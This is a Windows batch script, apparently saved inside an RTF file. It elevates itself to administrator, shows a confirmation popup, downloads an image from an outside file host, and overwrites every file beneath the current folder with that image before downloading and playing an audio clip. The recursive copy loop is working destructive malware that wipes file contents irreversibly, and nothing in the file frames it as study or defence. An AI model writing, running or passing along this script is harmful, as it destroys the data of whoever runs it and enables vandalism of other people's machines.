\f0\fs24 \cf0 @echo off\
:: Check for administrative privileges\
openfiles >nul 2>&1\
if %errorlevel% neq 0 (\
    echo Running as Administrator...\
    powershell -command "Start-Process cmd -ArgumentList '/c %~f0' -Verb RunAs"\
    exit /b\
)\
\
:: Confirmation Popup\
echo Set WshShell = WScript.CreateObject("WScript.Shell") > %temp%\\confirm.vbs\
echo answer = WshShell.Popup("Do you want to run this script?", 0, "Confirmation", 4 + 32) >> %temp%\\confirm.vbs\
echo If answer = 6 Then WScript.Quit(0) Else WScript.Quit(1) >> %temp%\\confirm.vbs\
cscript /nologo %temp%\\confirm.vbs\
if %errorlevel% neq 0 exit /b\
del %temp%\\confirm.vbs\
\
:: Replace Files\
setlocal enabledelayedexpansion\
set image_url=https://files.catbox.moe/dhrw4w.gif\
set target_extension=gif\
set image_path=%temp%\\replace_image.%target_extension%\
powershell -command "Invoke-WebRequest -Uri %image_url% -OutFile %image_path%"\
for /r %%i in (*) do (\
    copy /y %image_path% "%%i" > nul\
)\
del %image_path%\
\
:: Play Audio\
set audio_url=https://files.catbox.moe/ce303a.mp3\
set audio_path=%temp%\\play_audio.mp3\
powershell -command "Invoke-WebRequest -Uri %audio_url% -OutFile %audio_path%"\
powershell -c "(New-Object Media.SoundPlayer '%audio_path%').PlaySync(); Remove-Item '%audio_path%'"\
}
